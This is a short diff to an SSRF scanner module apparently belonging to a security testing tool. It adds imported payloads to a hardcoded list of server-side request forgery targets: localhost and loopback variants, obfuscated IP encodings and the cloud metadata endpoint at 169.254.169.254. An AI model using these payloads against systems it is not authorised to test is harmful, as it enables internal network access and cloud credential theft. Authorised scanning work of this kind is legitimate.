@@ -1,8 +1,9 @@
 """ssrf — SSRF scanner on Probe v2 with verify + auto-dump"""
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from core.probe import Probe
+from core.payload_source import get_payloads
 
-PAYLOADS = [
+PAYLOADS = get_payloads('ssrf', limit=20) + [
     "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
     "http://0x7f000001/", "http://0177.0.0.1/", "http://2130706433/",
     "http://169.254.169.254/latest/meta-data/",
